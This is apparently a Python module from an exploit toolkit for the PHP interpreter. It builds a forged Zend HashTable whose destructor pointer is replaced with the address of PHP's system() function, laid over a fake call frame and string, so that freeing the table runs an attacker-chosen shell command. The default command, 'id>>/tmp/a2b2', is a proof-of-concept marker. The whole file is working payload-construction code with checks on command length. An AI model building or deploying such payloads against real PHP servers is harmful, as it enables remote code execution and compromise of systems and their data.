"""Profile-described forged HashTable command carrier."""

from __future__ import annotations

from .schema import AbiLayout


DEFAULT_COMMAND = b"id>>/tmp/a2b2"


def command_capacity(value_length: int, abi: AbiLayout) -> int:
    return value_length - (abi.command_string_offset + abi.string_data_offset) - 1


def validate_command(command: bytes, value_length: int, abi: AbiLayout) -> None:
    if not command:
        raise ValueError("--cmd must not be empty")
    if b"\0" in command:
        raise ValueError("--cmd must not contain a NUL byte")
    capacity = command_capacity(value_length, abi)
    if len(command) > capacity:
        raise ValueError(
            f"--cmd is {len(command)} bytes; selected profile allows {capacity}"
        )


def store_unsigned(
    data: bytearray,
    offset: int,
    value: int,
    size: int,
    byte_order: str,
) -> None:
    data[offset:offset + size] = value.to_bytes(size, byte_order, signed=False)


def fake_hashtable(
    address: int,
    zif_system: int,
    value_length: int,
    *,
    abi: AbiLayout,
    command: bytes,
) -> bytes:
    """Build a HashTable, execute_data and zend_string overlap for zif_system."""
    validate_command(command, value_length, abi)
    payload = bytearray(value_length)
    execute_data = address + abi.execute_data_offset
    command_string = address + abi.command_string_offset

    for offset, value in (
        (abi.hashtable_gc_refcount_offset, abi.hashtable_gc_refcount),
        (abi.hashtable_gc_type_offset, abi.hashtable_gc_type),
        (abi.hashtable_flags_offset, abi.hashtable_flags),
        (abi.hashtable_mask_offset, abi.hashtable_mask),
        (abi.hashtable_n_used_offset, abi.hashtable_n_used),
        (abi.hashtable_n_elements_offset, abi.hashtable_n_elements),
        (abi.hashtable_size_offset, abi.hashtable_size),
        (abi.hashtable_internal_pointer_offset, abi.hashtable_internal_pointer),
    ):
        store_unsigned(payload, offset, value, 4, abi.byte_order)
    store_unsigned(
        payload, abi.hashtable_data_offset,
        execute_data, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, abi.hashtable_next_free_offset,
        abi.hashtable_next_free, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, abi.hashtable_destructor_offset,
        zif_system, abi.pointer_size, abi.byte_order,
    )

    execute = abi.execute_data_offset
    store_unsigned(
        payload, execute + abi.execute_call_info_offset,
        abi.execute_call_info, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_num_args_offset,
        abi.execute_num_args, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_offset,
        command_string, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_type_offset,
        abi.execute_argument_type, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_extra_offset,
        abi.execute_argument_extra, 4, abi.byte_order,
    )

    string = abi.command_string_offset
    store_unsigned(
        payload, string + abi.string_gc_refcount_offset,
        abi.string_gc_refcount, 4, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_gc_type_offset,
        abi.string_gc_type, 4, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_hash_offset,
        abi.string_hash, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_length_offset,
        len(command), abi.pointer_size, abi.byte_order,
    )
    start = string + abi.string_data_offset
    payload[start:start + len(command) + 1] = command + b"\0"
    return bytes(payload)
